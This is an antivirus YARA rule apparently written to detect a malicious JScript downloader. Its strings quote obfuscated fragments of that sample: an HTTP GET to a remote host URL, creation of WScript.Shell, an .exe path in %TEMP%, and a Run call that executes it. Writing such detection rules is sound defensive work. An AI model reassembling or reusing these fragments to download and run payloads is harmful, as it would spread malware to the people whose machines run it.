rule sig_20160401_884b94cb3334d2f15518e48016ba239f {
  meta:
    description = "datamaliciousorder - file 20160401_884b94cb3334d2f15518e48016ba239f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7ff46cfdf9e36869d0fdaf7538054b1cc7aeae89c375667a99cbbad3b6ecf065"

  strings:
    $s1  = "IupNr[MxNzy](\"G\" + \"ET\", \"http://ecomputercenter.com/d9sla\", false);" fullword ascii
    $s2  = "function UwkEqy(GyRkv, JnwJl){HahKaq = HahKaq * 1; return GyRkv - JnwJl;};" fullword ascii
    $s3  = "var NeeBls = function ZadPe() {return WScript[VoZw](\"WScript\"+\".Shell\");}(), OpvVy = 11;" fullword ascii
    $s4  = "if (IupNr[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function SzIfu(){return ItbWyd + \"\";};" fullword ascii
    $s6  = "function QejIsn() {return NeeBls[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"ODL34OF9IAj.ex\" + \"e\";};" fullword ascii
    $s7  = "function YdfHf() {return ((SevZo == true) && (SevZo == DszEvf)) ? 1 : HahKaq;};" fullword ascii
    $s8  = "var PjpZdj = false;" fullword ascii
    $s9  = "function CwDxh()" fullword ascii
    $s10 = "var DszEvf = false;" fullword ascii
    $s11 = "return UwkEqy(CrjVfx, VtOj);" fullword ascii
    $s12 = "var SevZo = false;" fullword ascii
    $s13 = "var XzGod = new this[\"Date\"]();" fullword ascii
    $s14 = "}while (UgQbm);" fullword ascii
    $s15 = "function UkpEq(){return 23;};" fullword ascii
    $s16 = "function CgiRn(OswPr) {var HmuDo = (1, 2, 3, 4, 5, OswPr); return HmuDo;};" fullword ascii
    $s17 = "SevZo = true; " fullword ascii
    $s18 = "function IzOi(GpAh){NeeBls[\"R\"+\"un\"](GpAh, HahKaq, HahKaq);};" fullword ascii
    $s19 = "DszEvf = true; " fullword ascii
    $s20 = "function PusZdw(){return VoZw;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}